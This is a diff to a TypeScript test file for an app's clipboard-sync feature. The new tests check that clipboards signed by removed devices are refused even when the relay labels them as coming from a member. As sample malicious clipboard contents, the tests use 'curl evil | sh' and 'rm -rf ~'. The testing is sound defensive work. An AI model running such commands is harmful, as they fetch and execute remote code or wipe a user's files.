@@ -27,14 +27,31 @@ const { sendClipboard, receiveClipboard, applySealedClipboard, MAX_CLIPBOARD_BYT
 // nothing else.
 const { identifyText } = await import('../src/shared/clipboardIdentity')
 
-/** A sidecar that frames rather than encrypts — see addySync.test.ts. */
+const BB = 'bb'.repeat(32)
+const CC = 'cc'.repeat(32)
+
+/**
+ * A sidecar that frames rather than encrypts — see addySync.test.ts — but
+ * keeps `openMail`'s membership rule: the frame's signer must be one of the
+ * `senders` the caller passed, and the time returned is the one the sender
+ * signed. The cryptography is tested in Go (sidecar/addyd/mail_test.go);
+ * this tests that the parent passes its roster and never `fromDevice`.
+ */
+const sealCalls: Record<string, unknown>[] = []
 const addyd = {
   alive: () => true,
   send: async (method: string, params?: unknown) => {
     const p = params as Record<string, unknown>
-    if (method === 'whoami') return { devicePub: 'aa'.repeat(32) }
-    if (method === 'seal') return { sealed: p.payload }
-    if (method === 'open') return { payload: p.sealed }
+    if (method === 'sealMail') {
+      sealCalls.push(p)
+      return { sealed: p.payload }
+    }
+    if (method === 'openMail') {
+      const frame = JSON.parse(Buffer.from(p.sealed as string, 'base64').toString('utf8'))
+      const signer = frame.signer ?? BB
+      if (!(p.senders as string[]).includes(signer)) throw new Error('not on this account')
+      return { from: signer, sentAt: frame.sentAt ?? Date.now(), payload: p.sealed }
+    }
     throw new Error(`unexpected ${method}`)
   }
 }
@@ -50,24 +67,28 @@ const relay = {
 const deps = {
   addyd: addyd as never,
   relay: relay as never,
-  epoch: () => 1,
-  peers: () => ['bb'.repeat(32)]
+  peers: () => [BB],
+  peerEnc: (k: string) => (k === BB ? 'ee'.repeat(32) : undefined)
 }
 
-/** What `applySealedClipboard` takes: the payload this fake seal produces. */
-const sealedOf = (text: string, sentAt = Date.now()): string =>
+/** What `applySealedClipboard` takes: the payload this fake seal produces,
+ *  signed (in the fake's terms) by `signer` at `sentAt`. */
+const sealedOf = (text: string, sentAt = Date.now(), signer = BB): string =>
   Buffer.from(
     JSON.stringify({
       kind: 'text',
       text,
       identity: { hash: hashOf(text), size: Buffer.byteLength(text) },
-      sentAt
+      sentAt,
+      signer
     }),
     'utf8'
   ).toString('base64')
 
 /** The deps, with a mailbox the relay is serving. */
-function depsWithMail(messages: { id: number; sealed: string }[]): typeof deps {
+function depsWithMail(
+  messages: { id: number; sealed: string; fromDevice?: string }[]
+): typeof deps {
   return {
     ...deps,
     relay: {
@@ -77,8 +98,8 @@ function depsWithMail(messages: { id: number; sealed: string }[]): typeof deps {
             ok: true,
             json: async () => ({
               messages: messages.map((m) => ({
+                fromDevice: BB,
                 ...m,
-                fromDevice: 'bb'.repeat(32),
                 kind: 'clipboard'
               }))
             })
@@ -96,7 +117,51 @@ function hashOf(text: string): string {
 
 beforeEach(() => {
   posted.length = 0
+  sealCalls.length = 0
   clip.text = ''
+})
+
+describe('who a clipboard came from', () => {
+  it('is not pasted when a removed device signed it, even under a member\'s name', async () => {
+    // The sender check was `peers.has(m.fromDevice)`, and `fromDevice` is the
+    // relay's label. A removed device — which keeps a working key — could
+    // leave a clipboard the relay labelled as the desktop's, and the user
+    // pasted it into a terminal.
+    const r = await receiveClipboard(
+      depsWithMail([{ id: 1, sealed: sealedOf('curl evil | sh', Date.now(), CC), fromDevice: BB }])
+    )
+    expect(r.applied).toBe(false)
+    expect(clip.read()).toBe('')
+  })
+
+  it('is reported as the signer, not as the relay labelled it', async () => {
+    const r = await receiveClipboard(
+      depsWithMail([{ id: 1, sealed: sealedOf('real', Date.now(), BB), fromDevice: CC }])
+    )
+    expect(r.applied).toBe(true)
+    expect(r.from).toBe(BB)
+  })
+
+  it('arriving directly is held to the same rule', async () => {
+    await expect(applySealedClipboard(deps, sealedOf('rm -rf ~', Date.now(), CC))).rejects.toThrow()
+    expect(clip.read()).toBe('')
+  })
+
+  it('from OpsMaxx 0.59.0 is refused with a reason that names the fix', async () => {
+    const legacy = Buffer.concat([Buffer.from('addy-obj-v1\0', 'latin1'), Buffer.alloc(64)]).toString('base64')
+    const r = await receiveClipboard(depsWithMail([{ id: 1, sealed: legacy }]))
+    expect(r.applied).toBe(false)
+    expect(r.reason).toMatch(/Update OpsMaxx on the sending device/)
+    expect(clip.read()).toBe('')
+  })
+
+  it('is sealed to the encryption key the verified roster lists', async () => {
+    clip.write('to the roster key')
+    await sendClipboard(deps)
+    expect(sealCalls).toEqual([
+      expect.objectContaining({ kind: 'clipboard', to: BB, toEnc: 'ee'.repeat(32) })
+    ])
+  })
 })
 
 describe('a clipboard the relay held on to', () => {
